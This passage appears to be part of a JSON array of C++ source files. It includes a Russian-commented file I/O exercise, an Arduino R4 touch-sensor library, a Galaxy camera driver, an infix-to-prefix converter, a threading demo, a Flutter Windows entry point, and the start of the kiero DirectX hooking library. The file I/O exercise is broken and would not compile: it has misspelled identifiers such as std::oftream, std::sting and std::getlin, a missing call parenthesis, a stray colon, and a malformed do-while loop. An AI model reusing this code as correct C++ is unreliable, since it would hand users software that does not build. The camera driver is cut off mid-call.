true;\n}\n\nLoggerL::~LoggerL()\n{\n\n}",
    "\ufeff#include <iostream>\n#include <fstream> //\u043f\u043e\u0434\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0435 \u0431\u0438\u0431\u043b\u0438\u043e\u0442\u0435\u043a\u0438 \u0445\u0440\u0430\u043d\u044f\u0449\u0438\u0439 \u0432 \u0441\u0435\u0431\u0435, \u043a\u043b\u0430\u0441\u0441\u044b \u0434\u043b\u044f \u0440\u0430\u0431\u043e\u0442\u044b \u0441 \u0444\u0430\u0439\u043b\u043e\u0432\u044b\u043c\u0438 \u043f\u043e\u0442\u043e\u043a\u0430\u043c\u0438\n#include <string>\nbool statistic(std::string str) {\n\tstd::oftream out;\n\tout.open(\"stats.txt\", std::ios::app);\n\tif (out.is_open()) {\n\t\tout << str << ' ' << str.length() << '\\n';\n\t\tout.close();\n\t\treturn true;\n\t}\n\treturn false;\n}\n\nvoid print_file(std::string paht) {\n\tstatic std::ifstream in;\n\tin.open(paht);\n\n\tif (in.is_open()) {\n\t\tchar sym;\n\t\twhile (in.get(sym))\n\t\t\tstd::cout << sym;\n\t\tstd::cout << std::endl;\n\t\tin.close();\n\t}\n}\n\nvoid clear_file(std::sting paht) {\n\tstatic std::ofstream out;\n\tout.open(paht);\n\tif (out.is_open())\n\t\tout.close;\n}\n\n\n\nint main() {\n\tsetlocale(LC_ALL, \"Russian\");\n\tint n;\n\tstd::string path = \"file.txt\";//\u043b\u044e\u0431\u044b\u0435 \u0440\u0430\u0441\u0448\u0438\u0440\u0435\u043d\u0438\u044f \u0444\u0430\u0439\u043b\u044b\n\t//\u0417\u0430\u043f\u0438\u0441\u044c \u0432 \u0444\u0430\u0439\u043b ofstream\n\t\n\t//std::ofstream out(path);//\u043e\u0442\u043a\u0440\u044b\u0442\u0438\u0435 \u0444\u0430\u0439\u043b\u0430\n\tstd::ofstream out;//\u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0444\u0430\u0439\u043b\u0430 \u0432 \u0441\u043b\u0443\u0447\u0430\u0435\u0442 \u0435\u0433\u043e \u043e\u0442\u0441\u0443\u0442\u0441\u0432\u0438\u044f, \u043b\u0438\u0431\u043e \u0437\u0430\u043f\u0438\u0441\u044b\u0432\u0430\u0435\u0442\n\tout.open(path, std::ios::app); \n\n\tif (out.is_open()) {//\u043e\u0442\u043a\u0440\u044b\u0442\u0438\u0435 \u0444\u0430\u0439\u043b\u0430\n\t\tstd::cout << \"\u0424\u0430\u0439\u043b \u043e\u0442\u043a\u0440\u044b\u0442 \u0434\u043b\u044f \u0437\u0430\u043f\u0438\u0441\u0438.\\n\";\n\n\t\tstd::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0441\u0442\u0440\u043e\u043a\u0443: \";\n\t\tstd::string str;\n\t\tstd::getline(std::cin, str);\n\t\tout << str << '\\n';//\u0437\u0430\u043f\u0438\u0441\u044c \u0432 \u0444\u0430\u0439\u043b, \u043e\u0431\u044f\u0437\u0430\u0442\u0435\u043b\u044c\u043d\u043e \u043d\u0443\u0436\u043d\u0430 \u043f\u0443\u0441\u0442\u0430\u044f c\u0442\u0440\u043e\u043a\u0430\n\n\t\tout.close();//\u0437\u0430\u043a\u0440\u044b\u0442\u0438\u0435 \u0444\u0430\u0439\u043b\u0430\n\t}\n\telse\n\t\tstd::cout << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u043e\u0442\u043a\u0440\u044b\u0442\u0438\u044f \u0444\u0430\u0439\u043b\u0430\\n\";\n\n\t//\u0427\u0442\u0435\u043d\u0438\u0435 \u0438\u0437 \u0444\u0430\u0439\u043b\u0430 ofstream\n\tstd::ifstream in;\n\tin.open(path);\n\n\tif (in.is_open()) {\n\t\tstd::cout << \"\u0421\u043e\u0434\u0435\u0440\u0436\u0438\u043c\u043e\u0435 \u0444\u0430\u0439\u043b\u0430:\\n\";\n\t\t//\u041f\u043e\u0441\u0438\u043c\u0432\u043e\u043b\u044c\u043d\u043e\u0435 \u0441\u0447\u0438\u0442\u044b\u0432\u0430\u043d\u0438\u0435\n\t\t//char sym;\n\t\t//while (in.get(sym))\n\t\t//\tstd::cout << sym;\n\n\t\t//\u041f\u043e\u0441\u043b\u043e\u0432\u043d\u043e\u0435 \u0441\u0447\u0438\u0442\u044b\u0432\u0430\u043d\u0438\u0435 \n\t\t//std::string word;\n\t\t//while (!in.eof()) {\n\t\t\t//std::string word;\n\t\t\t//in >> word;\n\t\t\t//std::cout << word << std::endl;\n\t\t//}\n\n\t\t//\u041f\u043e\u0441\u0442\u0440\u043e\u0447\u043d\u043e\u0435 \u0441\u0447\u0438\u0442\u044b\u0432\u0430\u043d\u0438\u0435\n\t\tstd::string str;\n\t\twhile (std::getline(in, str)) \n\t\t\tstd::cout << str << std::endl;\n\t\t\n\n\t\tin.close();\n\t}\n\telse\n\t\tstd::cout << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u043e\u0442\u043a\u0440\u044b\u0442\u0438\u044f \u0444\u0430\u0439\u043b\u0430!\\n\";\n\t//\u0423\u0434\u0430\u043b\u0435\u043d\u0438\u0435 \u0444\u0430\u0439\u043b\u0430\n\tif (remove(path.c_str()) == 0) //\u0443\u0434\u0430\u043b\u044f\u0435\u0442\u0441\u044f \u0444\u0430\u0439\u043b, \u043f\u043e\u043b\u043d\u043e\u0441\u0442\u044c\u044e\n\t\tstd::cout << \"\u0424\u0430\u0439\u043b \u0443\u0434\u0430\u043b\u0435\u043d!\\n\";\n\telse\n\t\tstd::cout << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u0443\u0434\u0430\u043b\u0435\u043d\u0438\u044f \u0444\u0430\u0439\u043b\u0430!\\n\";\n\n\t//\u0417\u0430\u0434\u0430\u0447\u0430 1\n\tstd::cout << \"\u0417\u0430\u0434\u0430\u0447\u0430 1.\\n\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0441\u0442\u0440\u043e\u043a\u0443:\";\n\tstd::string str1;\n\tstd::getlin(std::cin, str1);\n\tif (statistic(str1))\n\t\tstd::cout << \"\u0437\u0430\u043f\u0438\u0441\u044c \u0434\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u0430.\\n\\n\";\n\telse\n\t\tstd::cout << \"\u041e\u0448\u0438\u0431\u043a\u0430!\\n\\n\";\n\n\t//\u0417\u0430\u0434\u0430\u0447\u0430 2 \u0443\u0441\u043b.\n\tstd::cout << \"\u0417\u0430\u0434\u0430\u0447\u0430 2.\\n\";\n\tint operation;\n\tdo {\n\t\tstd::cout << \"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u0435:\\n\\n\";\n\t\tstd::cout << \"1. \u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u043c\u043e\u0435 \u0444\u0430\u0439\u043b\u0430;\\n\";\n\t\tstd::cout << \"2.\u0412\u044b\u0432\u0435\u0441\u0442\u0438 \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u043c\u043e\u0435;\\n\";\n\t\tstd::cout << \"3.\u041e\u0447\u0438\u0441\u0442\u0438\u0442\u044c \u0444\u0430\u0439\u043b;\\n\";\n\t\tstd::cout << \"4.\u0417\u0430\u0432\u0435\u0440\u0448\u0438\u0442\u044c \u0440\u0430\u0431\u043e\u0442\u0443;\\n\";\n\t\tstd::cout << \"\u0412\u0432\u043e\u0434 -> \";\n\t\tstd::cin >> operation;\n\n\t\tswitch (operation) {\n\t\tcase 1: {\n\t\t\tstd::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0441\u0442\u0440\u043e\u043a\u0443:\\n\";\n\t\t\tstd::con.ignore;\n\t\t\tstd::string str2;\n\t\t\tstd::getline(std::cin, str2);\n\t\t\tstatistic(str2);\n\t\t\tstd::cout << \"\u0421\u0442\u0430\u0442\u0438\u0441\u0442\u0438\u043a\u0430 \u0432\u043d\u0435\u0441\u0435\u043d\u0430.\\n\\n\";\n\t\t\tbreak;\n\t\t}\n\t\tcase 2:\n\t\t\tstd::cout << \"\u0421\u043e\u0434\u0435\u0440\u0436\u0438\u043c\u043e\u0435 \u0444\u0430\u0439\u043b\u0430:\\n\";\n\t\t\tprint_file(\"stats.txt\");\n\t\t\tbreak;\n\t\t}\n\t\tcase 3: {\n\t\t\tstd::cout << \"\u0412\u044b \u0443\u0432\u0435\u0440\u0435\u043d\u044b \u0447\u0442\u043e \u0445\u043e\u0442\u0438\u0442\u0435 \u043e\u0447\u0438\u0441\u0442\u0438\u0442\u044c \u0444\u0430\u0439\u043b? (y/n)\";\n\t\t\tchar answer;\n\t\t\tstd::cin >> answer;\n\t\t\tif (answer == 'y') {\n\t\t\t\tclear_file(\"stats.txt\");\n\t\t\t\tstd::cout << \"\u0424\u0430\u0439\u043b \u043e\u0447\u0435\u0449\u0435\u043d\\n\\n\":\n\t\t\t}\n\t\t\telse\n\t\t\t\tstd::cout << \"\u041e\u0442\u043c\u0435\u043d\u0430 \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u0438!\";\n\t\t\tbreak;\n\t\t}\n\t\tcase 4:\n\t\t\tstd::cout << \"\u0417\u0430\u0432\u0435\u0440\u0448\u0435\u043d\u0438\u0435 \u0440\u0430\u0431\u043e\u0442\u044b...\\n\";\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tstd::cout << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u0432\u0432\u043e\u0434\u0430!\\n\\n\";\n\n\t}while(operation != 4)\n\n\n\n\n\treturn 0;\n}",
    "/*\n\nR4_Touch.cpp  --  Capacitive Touch Sensing for Arduino UNO-R4\n     Copyright (C) 2024  David C.\n\n     This program is free software: you can redistribute it and/or modify\n     it under the terms of the GNU General Public License as published by\n     the Free Software Foundation, either version 3 of the License, or\n     (at your option) any later version.\n\n     This program is distributed in the hope that it will be useful,\n     but WITHOUT ANY WARRANTY; without even the implied warranty of\n     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n     GNU General Public License for more details.\n\n     You should have received a copy of the GNU General Public License\n     along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\n     */\n\n#include \"R4_Touch.h\"\n\nbool TouchSensor::begin(const uint8_t pin, const uint16_t threshold)\n{\n    _pin = pin;\n    _threshold = threshold;\n    return setTouchMode(_pin);\n}\nbool TouchSensor::read() { return (touchRead(_pin) > _threshold); }\nuint16_t TouchSensor::readRaw() { return touchRead(_pin); }\nuint16_t TouchSensor::readReference() { return touchReadReference(_pin); }\n\nvoid TouchSensor::setThreshold(const uint16_t t) { _threshold = t; }\nuint16_t TouchSensor::getThreshold() { return _threshold; }\n\nvoid TouchSensor::setClockDiv(const ctsu_clock_div_t s) { setTouchPinClockDiv(_pin, s); }\nvoid TouchSensor::setIcoGain(const ctsu_ico_gain_t s) { setTouchPinIcoGain(_pin, s); }\nvoid TouchSensor::setReferenceCurrent(const uint8_t s) { setTouchPinReferenceCurrent(_pin, s); }\nvoid TouchSensor::setMeasurementCount(const uint8_t s) { setTouchPinMeasurementCount(_pin, s); }\nvoid TouchSensor::setSensorOffset(const uint16_t s) { setTouchPinSensorOffset(_pin, s); }\nvoid TouchSensor::applyPinSettings(const ctsu_pin_settings_t s) { applyTouchPinSettings(_pin, s); }\nctsu_pin_settings_t TouchSensor::getPinSettings() { return getTouchPinSettings(_pin); }\n\nvoid TouchSensor::start() { startTouchMeasurement(); }\nvoid TouchSensor::stop() { stopTouchMeasurement(); }\nvoid TouchSensor::startSingle()\n{\n    startTouchMeasurement(false);\n    while (!touchMeasurementReady())\n        ;\n}\nvoid TouchSensor::attachCallback(fn_callback_ptr_t cb) { attachMeasurementEndCallback(cb); };",
    "#include \"camera_galaxy.h\"\n#include<vector>\n#include<fstream>\n#include\"set_calib_looktable.h\"\n#include\"critical zone.h\"\n#include \"easylogging++.h\"\n\n#define Write_Pattern_Order             0x98\n#define Read_Pattern_Order              0x99\nCameraGalaxy::CameraGalaxy()\n{\n}\nCameraGalaxy::~CameraGalaxy()\n{\n}\n\n\nbool CameraGalaxy::trigger_software()\n{\n    GX_STATUS status = GX_STATUS_SUCCESS;\n    // \u53d1\u9001\u8f6f\u89e6\u53d1\u547d\u4ee4\n    status = GXSendCommand(hDevice_, GX_COMMAND_TRIGGER_SOFTWARE);\n    if (status != GX_STATUS_SUCCESS)\n    {\n        return false;\n    }\n    return true;\n}\n\nbool CameraGalaxy::streamOn() {\n\n    GX_STATUS status = GX_STATUS_SUCCESS;\n    status = GXSendCommand(hDevice_, GX_COMMAND_ACQUISITION_START);\n    if (status != GX_STATUS_SUCCESS)\n    {\n        std::cout << \"\u8bbe\u7f6e\u5f00\u59cb\u91c7\u96c6\u5931\u8d25\uff01\" << std::endl;\n\n    }\n    /*status = GXSendCommand(hDevice_, GX_TRIGGER_SOURCE_LINE0);\n    if (status != GX_STATUS_SUCCESS)\n    {\n        std::cout << \"\u8bbe\u7f6eline0\u5931\u8d25\uff01\" << std::endl;\n\n    }*/\n    return true;\n}\n\nbool CameraGalaxy::streamOff() {\n\n    GX_STATUS status = GX_STATUS_SUCCESS;\n    status = GXSendCommand(hDevice_, GX_COMMAND_ACQUISITION_STOP);\n    if (status != GX_STATUS_SUCCESS)\n    {\n        std::cout << \"\u8bbe\u7f6e\u505c\u6b62\u91c7\u96c6\u5931\u8d25\uff01\" << std::endl;\n\n    }\n    return true;\n}\n\n\nbool CameraGalaxy::grap(unsigned char* buf)\n{\n    if (pixel_format_ != 8)\n    {\n        LOG(INFO) << \"set pixel format\";\n   \n        return false;\n    }\n\n    int64_t nPayLoadSize = 0;\n    GX_STATUS status = GX_STATUS_SUCCESS;\n    status = GXGetInt(hDevice_, GX_INT_PAYLOAD_SIZE, &nPayLoadSize);\n    if (status != GX_STATUS_SUCCESS)\n    {\n        std::cout << \"\u83b7\u53d6\u6570\u636e\u5927\u5c0f\u5931\u8d25\uff01\" << std::endl;\n    }\n\n    pFrameData.pImgBuf = malloc((size_t)nPayLoadSize);\n\n    if (GXGetImage(hDevice_, &pFrameData, 1000) != GX_STATUS_SUCCESS)\n    {\n        return false;\n    }\n\n    if (pFrameData.nStatus == GX_FRAME_STATUS_SUCCESS && pFrameData.pImgBuf != nullptr)\n    {\n        memcpy(buf, pFrameData.pImgBuf, pFrameData.nImgSize);\n        free(pFrameData.pImgBuf);\n    }\n    else\n    {\n        free(pFrameData.pImgBuf);\n        return false;\n    }\n\n    return true;\n}\n\nbool CameraGalaxy::grap(unsigned short* buf)\n{\n    if (pixel_format_ != 12)\n    {\n        LOG(INFO) << \"set pixel format\";\n        return false;\n    }\n\n    int64_t nPayLoadSize = 0;\n    GX_STATUS status = GX_STATUS_SUCCESS;\n    status = GXGetInt(hDevice_, GX_INT_PAYLOAD_SIZE, &nPayLoadSize);\n    if (status != GX_STATUS_SUCCESS)\n    {\n        std::cout << \"\u83b7\u53d6\u6570\u636e\u5927\u5c0f\u5931\u8d25\uff01\" << std::endl;\n    }\n\n    pFrameData.pImgBuf = malloc((size_t)nPayLoadSize);\n\n    if (GXGetImage(hDevice_, &pFrameData, 1000) != GX_STATUS_SUCCESS)\n    {\n        return false;\n    }\n\n    if (pFrameData.nStatus == GX_FRAME_STATUS_SUCCESS && pFrameData.pImgBuf != nullptr)\n    {\n        memcpy(buf, pFrameData.pImgBuf, pFrameData.nImgSize);\n        free(pFrameData.pImgBuf);\n    }\n    else\n    {\n        free(pFrameData.pImgBuf);\n        return false;\n    }\n\n    return true;\n}\n\nbool CameraGalaxy::setPixelFormat(int val)\n{\n    \n    LOG(INFO) << \"set pixel format:\"<<val;\n    GXSendCommand(hDevice_, GX_COMMAND_ACQUISITION_STOP);\n\n    switch (val)\n    {\n    case 8:\n        GXSetEnum(hDevice_, GX_ENUM_PIXEL_FORMAT, GX_PIXEL_FORMAT_MONO8);\n        pixel_format_ = val;\n        break;\n    case 12:\n        GXSetEnum(hDevice_, GX_ENUM_PIXEL_FORMAT, GX_PIXEL_FORMAT_MONO10);\n        pixel_format_ = val;\n        break;\n    default:\n        break;\n    }\n\n    return true;\n}\n\nbool CameraGalaxy::getPixelFormat(int& val)\n{\n    val = pixel_format_;\n\n    return true;\n}\n\nbool CameraGalaxy::getMinExposure(float& val)\n{\n    double dValue = 0;\n    if (GXGetFloat(hDevice_, GX_FLOAT_CURRENT_ACQUISITION_FRAME_RATE, &dValue) != GX_STATUS_SUCCESS)\n    {\n        //std::cout << \"__________getMinExposure failed___________\" << std::endl;\n        return false;\n    }\n    val = (int)(1000000 / dValue);\n\n    return true;\n}\n\nbool CameraGalaxy::openCamera()\n{\n    std::lock_guard<std::mutex> my_guard(operate_mutex_);\n\n    GX_STATUS status = GX_STATUS_SUCCESS;\n    uint32_t nDeviceNum = 0;\n\n    status = GXInitLib();\n    if (status != GX_STATUS_SUCCESS)\n    {\n        return false;\n    }\n\n    status = GXUpdateDeviceList(&nDeviceNum, 1000);\n    if ((status != GX_STATUS_SUCCESS) || (nDeviceNum <= 0))\n    {\n        return false;\n    }\n\n    char cam_idx[8] = \"0\";\n    if (status == GX_STATUS_SUCCESS && nDeviceNum > 0)\n    {\n        GX_DEVICE_BASE_INFO* pBaseinfo = new GX_DEVICE_BASE_INFO[nDeviceNum];\n        size_t nSize = nDeviceNum * sizeof(GX_DEVICE_BASE_INFO);\n\n        status = GXGetAllDeviceBaseInfo(pBaseinfo, &nSize);\n        for (int i = 0; i < nDeviceNum; i++)\n        {\n            if (GX_DEVICE_CLASS_U3V == pBaseinfo[i].deviceClass)\n            {\n                snprintf(cam_idx, 8, \"%d\", i + 1);\n            }\n        }\n\n        delete[] pBaseinfo;\n    }\n\n    GX_OPEN_PARAM stOpenParam;\n    stOpenParam.accessMode = GX_ACCESS_EXCLUSIVE;\n    stOpenParam.openMode = GX_OPEN_INDEX;\n    stOpenParam.pszContent = cam_idx;\n    status = GXOpenDevic",
    "// C++ program to convert infix to prefix\r\n#include <bits/stdc++.h>\r\nusing namespace std;\r\n\r\n// Function to check if the character is an operator\r\nbool isOperator(char c)\r\n{\r\n\treturn (!isalpha(c) && !isdigit(c));\r\n}\r\n\r\n// Function to get the priority of operators\r\nint getPriority(char C)\r\n{\r\n\tif (C == '-' || C == '+')\r\n\t\treturn 1;\r\n\telse if (C == '*' || C == '/')\r\n\t\treturn 2;\r\n\telse if (C == '^')\r\n\t\treturn 3;\r\n\treturn 0;\r\n}\r\n\r\n// Function to convert the infix expression to postfix\r\nstring infixToPostfix(string infix)\r\n{\r\n\tinfix = '(' + infix + ')';\r\n\tint l = infix.size();\r\n\tstack<char> char_stack;\r\n\tstring output;\r\n\r\n\tfor (int i = 0; i < l; i++) {\r\n\r\n\t\t// If the scanned character is an\r\n\t\t// operand, add it to output.\r\n\t\tif (isalpha(infix[i]) || isdigit(infix[i]))\r\n\t\t\toutput += infix[i];\r\n\r\n\t\t// If the scanned character is an\r\n\t\t// \u2018(\u2018, push it to the stack.\r\n\t\telse if (infix[i] == '(')\r\n\t\t\tchar_stack.push('(');\r\n\r\n\t\t// If the scanned character is an\r\n\t\t// \u2018)\u2019, pop and output from the stack\r\n\t\t// until an \u2018(\u2018 is encountered.\r\n\t\telse if (infix[i] == ')') {\r\n\t\t\twhile (char_stack.top() != '(') {\r\n\t\t\t\toutput += char_stack.top();\r\n\t\t\t\tchar_stack.pop();\r\n\t\t\t}\r\n\r\n\t\t\t// Remove '(' from the stack\r\n\t\t\tchar_stack.pop();\r\n\t\t}\r\n\r\n\t\t// Operator found\r\n\t\telse {\r\n\t\t\tif (isOperator(char_stack.top())) {\r\n\t\t\t\tif (infix[i] == '^') {\r\n\t\t\t\t\twhile (\r\n\t\t\t\t\t\tgetPriority(infix[i])\r\n\t\t\t\t\t\t<= getPriority(char_stack.top())) {\r\n\t\t\t\t\t\toutput += char_stack.top();\r\n\t\t\t\t\t\tchar_stack.pop();\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t\telse {\r\n\t\t\t\t\twhile (\r\n\t\t\t\t\t\tgetPriority(infix[i])\r\n\t\t\t\t\t\t< getPriority(char_stack.top())) {\r\n\t\t\t\t\t\toutput += char_stack.top();\r\n\t\t\t\t\t\tchar_stack.pop();\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\r\n\t\t\t\t// Push current Operator on stack\r\n\t\t\t\tchar_stack.push(infix[i]);\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\twhile (!char_stack.empty()) {\r\n\t\toutput += char_stack.top();\r\n\t\tchar_stack.pop();\r\n\t}\r\n\treturn output;\r\n}\r\n\r\n// Function to convert infix to prefix notation\r\nstring infixToPrefix(string infix)\r\n{\r\n\t// Reverse String and replace ( with ) and vice versa\r\n\t// Get Postfix\r\n\t// Reverse Postfix\r\n\tint l = infix.size();\r\n\r\n\t// Reverse infix\r\n\treverse(infix.begin(), infix.end());\r\n\r\n\t// Replace ( with ) and vice versa\r\n\tfor (int i = 0; i < l; i++) {\r\n\r\n\t\tif (infix[i] == '(') {\r\n\t\t\tinfix[i] = ')';\r\n\t\t}\r\n\t\telse if (infix[i] == ')') {\r\n\t\t\tinfix[i] = '(';\r\n\t\t}\r\n\t}\r\n\r\n\tstring prefix = infixToPostfix(infix);\r\n\r\n\t// Reverse postfix\r\n\treverse(prefix.begin(), prefix.end());\r\n\r\n\treturn prefix;\r\n}\r\n\r\n// Driver code\r\nint main()\r\n{\r\n\tstring s = (\"x+y*z/w+u\");\r\n\r\n\t// Function call\r\n\tcout << infixToPrefix(s) << std::endl;\r\n\treturn 0;\r\n}\r\n",
    "//\n//  main.cpp\n//  1\n//\n//  Created by \u0410\u043b\u0435\u043a\u0441\u0430\u043d\u0434\u0440 \u0426\u044b\u043f\u043b\u0430\u043a\u043e\u0432 on 21.05.2023.\n//\n\n#include <iostream>\n#include <thread>\n#include <queue>\n#include <functional>\n#include <future>\n#include <condition_variable>\n\nstd::queue<std::packaged_task<int()>> taskQueue;\nstd::mutex mutex;\nstd::condition_variable cv;\n\nvoid workerThread()\n{\n    while (true)\n    {\n        std::unique_lock<std::mutex> lock(mutex);\n        cv.wait(lock, [] { return !taskQueue.empty(); });\n\n        std::packaged_task<int()> task = std::move(taskQueue.front());\n        taskQueue.pop();\n\n        lock.unlock();\n\n        task(); // \u0412\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u0435 \u0437\u0430\u0434\u0430\u0447\u0438\n    }\n}\n\nint factorial(int n)\n{\n    int result = 1;\n    for (int i = 2; i <= n; ++i)\n    {\n        result *= i;\n    }\n    return result;\n}\n\nint main()\n{\n    std::thread worker(workerThread);\n\n    // \u0421\u043e\u0437\u0434\u0430\u0435\u043c \u043d\u0435\u0441\u043a\u043e\u043b\u044c\u043a\u043e packaged_task \u0438 \u043f\u043e\u043c\u0435\u0449\u0430\u0435\u043c \u0438\u0445 \u0432 \u043e\u0447\u0435\u0440\u0435\u0434\u044c\n    for (int i = 1; i <= 5; ++i)\n    {\n        std::packaged_task<int()> task(std::bind(factorial, i));\n        std::future<int> future = task.get_future();\n\n        std::unique_lock<std::mutex> lock(mutex);\n        taskQueue.push(std::move(task));\n        lock.unlock();\n\n        cv.notify_one();\n\n        std::cout << \"\u0417\u0430\u0434\u0430\u0447\u0430 \" << i << \" \u0434\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u0430 \u0432 \u043e\u0447\u0435\u0440\u0435\u0434\u044c.\" << std::endl;\n        std::cout << \"\u041e\u0436\u0438\u0434\u0430\u0435\u043c \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442: \" << future.get() << std::endl;\n    }\n\n    worker.join();\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"untitled\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"kiero.h\"\n#include <Windows.h>\n#include <assert.h>\n\n#if KIERO_INCLUDE_D3D9\n# include <d3d9.h>\n#endif\n\n#if KIERO_INCLUDE_D3D10\n# include <dxgi.h>\n# include <d3d10_1.h>\n# include <d3d10.h>\n#endif\n\n#if KIERO_INCLUDE_D3D11\n# include <dxgi.h>\n# include <d3d11.h>\n#endif\n\n#if KIERO_INCLUDE_D3D12\n# include <dxgi.h>\n# include <d3d12.h>\n#endif\n\n#if KIERO_INCLUDE_OPENGL\n# include <gl/GL.h>\n#endif\n\n#if KIERO_INCLUDE_VULKAN\n# include <vulkan/vulkan.h>\n#endif\n\n#if KIERO_USE_MINHOOK\n# include \"minhook/include/MinHook.h\"\n#endif\n\n#ifdef _UNICODE\n# define KIERO_TEXT(text) L##text\n#else\n# define KIERO_TEXT(text) text\n#endif\n\n#define KIERO_ARRAY_SIZE(arr) ((size_t)(sizeof(arr)/sizeof(arr[0])))\n\nstatic kiero::RenderType::Enum g_renderType = kiero::RenderType::None;\nstatic uint150_t* g_methodsTable = NULL;\n\nkiero::Status::Enum kiero::init(RenderType::Enum _renderType)\n{\n\tif (g_renderType != RenderType::None)\n\t{\n\t\treturn Status::AlreadyInitializedError;\n\t}\n\n\tif (_renderType != RenderType::None)\n\t{\n\t\tif (_renderType >= RenderType::D3D9 && _renderType <= RenderType::D3D12)\n\t\t{\n\t\t\tWNDCLASSEX windowClass;\n\t\t\twindowClass.cbSize = sizeof(WNDCLASSEX);\n\t\t\twindowClass.style = CS_HREDRAW | CS_VREDRAW;\n\t\t\twindowClass.lpfnWndProc = DefWindowProc;\n\t\t\twindowClass.cbClsExtra = 0;\n\t\t\twindowClass.cbWndExtra = 0;\n\t\t\twindowClass.hInstance = GetModuleHandle(NULL);\n\t\t\twindowClass.hIcon = NULL;\n\t\t\twindowClass.hCursor = NULL;\n\t\t\twindowClass.hbrBackground = NULL;\n\t\t\twindowClass.lpszMenuName = NULL;\n\t\t\twindowClass.lpszClassName = KIERO_TEXT(\"Kiero\");\n\t\t\twindowClass.hIconSm = NULL;\n\n\t\t\t::RegisterClassEx(&windowClass);\n\n\t\t\tHWND window = ::CreateWindow(windowClass.lpszClassName, KIERO_TEXT(\"Kiero DirectX Window\"), WS_OVERLAPPEDWINDOW, 0, 0, 100, 100, NULL, NULL, windowClass.hInstance, NULL);\n\n\t\t\tif (_renderType == RenderType::D3D9)\n\t\t\t{\n#if KIERO_INCLUDE_D3D9\n\t\t\t\tHMODULE libD3D9;\n\t\t\t\tif ((libD3D9 = ::GetModuleHandle(KIERO_TEXT(\"d3d9.dll\"))) == NULL)\n\t\t\t\t{\n\t\t\t\t\t::DestroyWindow(window);\n\t\t\t\t\t::UnregisterClass(windowClass.lpszClassName, windowClass.hInstance);\n\t\t\t\t\treturn Status::ModuleNotFoundError;\n\t\t\t\t}\n\n\t\t\t\tvoid* Direct3DCreate9;\n\t\t\t\tif ((Direct3DCreate9 = ::GetProcAddress(libD3D9, \"Direct3DCreate9\")) == NULL)\n\t\t\t\t{\n\t\t\t\t\t::DestroyWindow(window);\n\t\t\t\t\t::UnregisterClass(windowClass.lpszClassName, windowClass.hInstance);\n\t\t\t\t\treturn Status::UnknownError;\n\t\t\t\t}\n\n\t\t\t\tLPDIRECT3D9 direct3D9;\n\t\t\t\tif ((direct3D9 = ((LPDIRECT3D9(__stdcall*)(uint32_t))(Direct3DCreate9))(D3D_SDK_VERSION)) == NULL)\n\t\t\t\t{\n\t\t\t\t\t::DestroyWindow(window);\n\t\t\t\t\t::UnregisterClass(windowClass.lpszClassName, windowClass.hInstance);\n\t\t\t\t\treturn Status::UnknownError;\n\t\t\t\t}\n\n\t\t\t\tD3DDISPLAYMODE displayMode;\n\t\t\t\tif (direct3D9->GetAdapterDisplayMode(D3DADAPTER_DEFAULT, &displayMode) < 0)\n\t\t\t\t{\n\t\t\t\t\t::DestroyWindow(window);\n\t\t\t\t\t::UnregisterClass(windowClass.lpszClassName, windowClass.hInstance);\n\t\t\t\t\treturn Status::UnknownError;\n\t\t\t\t}\n\n\t\t\t\tD3DPRESENT_PARAMETERS params;\n\t\t\t\tparams.BackBufferWidth = 0;\n\t\t\t\tparams.BackBufferHeight = 0;\n\t\t\t\tparams.BackBufferFormat = displayMode.Format;\n\t\t\t\tparams.BackBufferCount = 0;\n\t\t\t\tparams.MultiSampleType = D3DMULTISAMPLE_NONE;\n\t\t\t\tparams.MultiSampleQuality = NULL;\n\t\t\t\tparams.SwapEffect = D3DSWAPEFFECT_DISCARD;\n\t\t\t\tparams.hDeviceWindow = window;\n\t\t\t\tparams.Windowed = 1;\n\t\t\t\tparams.EnableAutoDepthStencil = 